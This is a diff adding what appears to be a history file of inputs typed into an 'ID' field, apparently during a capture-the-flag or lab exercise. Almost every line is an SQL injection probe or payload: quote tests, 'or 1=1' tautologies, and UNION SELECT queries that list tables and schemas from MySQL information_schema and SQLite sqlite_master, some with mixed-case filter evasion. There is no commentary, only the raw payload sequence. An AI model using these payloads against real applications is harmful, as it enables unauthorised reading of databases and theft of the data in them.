@@ -1,0 +1,81 @@
+ID:1
+ID:1
+ID:2
+ID:3
+ID:4
+ID:5
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="challenges" -- -
+ID:' UNION SELECT 1,2-- -
+ID:' UNION SELECT 1,2,3-- -
+ID:" UNION SELECT 1,2,3-- -
+ID:' UNION SELECT 1,2-- -
+ID:'
+ID:"
+ID:' UNION SELECT 1,2-- -
+ID:'
+ID:'-- -
+ID:(
+ID:a
+ID:0
+ID:1
+ID:2
+ID:2'
+ID:2''
+ID:2""
+ID:2'
+ID:"
+ID:1"--
+ID:1"-- -
+ID:1"-- -"
+ID:1-- -
+ID:1"-- -
+ID:1 union select 1,2,3 -- -
+ID: union select 1,2,3 -- -
+ID:1 or 1=1 -- -
+ID:0 or 1=1 -- -
+ID:0 union select 1,2,3 --
+ID:0 union select 1,version(),3 --
+ID:0 union select 1,2,sql FROM sqlite_schema --
+ID:0 union select sql FROM sqlite_schema --
+ID:0 union select group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -
+ID:0 union select sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' -- -
+ID:0 union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' -- -
+ID:0 union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ="table_name" -- -
+ID:0 union SELECT sql FROM sqlite_master WHERE type!="meta" AND sql NOT NULL AND name ="table_name" -- -
+ID:0 union SELECT 1,2,sql FROM sqlite_master WHERE type!="meta" AND sql NOT NULL AND name ="table_name" -- -
+ID:0 union select 1,2,3 --
+ID:0 union select 1,2,sql FROM sqlite_schema --
+ID:0 union select 1,2,3 --
+ID:0 union select 1,2,3 --
+ID:0 union select 1,2,sql from  --
+ID:0 union select 1,2,sql from sqlite_schema; --
+ID:0 union select 1,2,sql from sqlite_schema --
+ID:0 union select 1,version()--
+ID:0 union select 1,2,version()--
+ID:0 union select 1,2,sql from --
+ID:0 union select 1,2,sql from sqlite_schema --
+ID:0 union select 1,2,sql from sqlite_schema '--
+ID:0 union select 1,2,sql from sqlite_schema "--
+ID:0 union select 1,2,sql from sqlite_schema --
+ID:0' union select 1,2,sql from sqlite_schema --
+ID:0" union select 1,2,sql from sqlite_schema --
+ID:0 union select 1,2,sql from sqlite_schema --
+ID:0 union select 1,2,sql from sqlite_schema -- -
+ID:0 union select 1,2,sql from sqlite_schema --'
+ID:0 union select 1,2,3--
+ID:0 union select 1,2,3from abc--
+ID:0 union select 1,2,3 from abc--
+ID:0 union select 1,2,3 from username--
+ID:0 union select 1,2,sql FROM sqlite_schema --
+ID:0 union select 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
+ID:0 union select 1,2,group_concat(tbl_name) FROM information_schema.tables WHERE type='table' and tbl_name NOT like 'sqlite_%'--
+ID:0 union select 1,2,group_concat(tbl_name) FROM information_schema.tables WHERE type='table' and challenge NOT like 'sqlite_%'--
+ID:0 union select 1,2,group_concat(tbl_name) from information_schema.tables where table_schema="challenges" --
+ID:0 union select 1,2,sql FROM sqlite_schema --
+ID:0 union select 1,2,gRoUp_cOncaT('schema_name') fRoM information_schema.schemata --
+ID:0 union select 1,2,gRoUp_cOncaT('table_name') fRoM information_schema.schemata --
+ID:0 union select 1,2,gRoUp_cOncaT('table_name') fRoM information_schema.tables --
+ID:0 union select 1,2,gRoUp_cOncaT('table_name') fRoM information_schema.tables wHeRe table_schema=security --
+ID:0 union select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata --
+ID:0 union select 1,2,gRoUp_cOncaT(schema_name) fRoM information_schema.schemata --
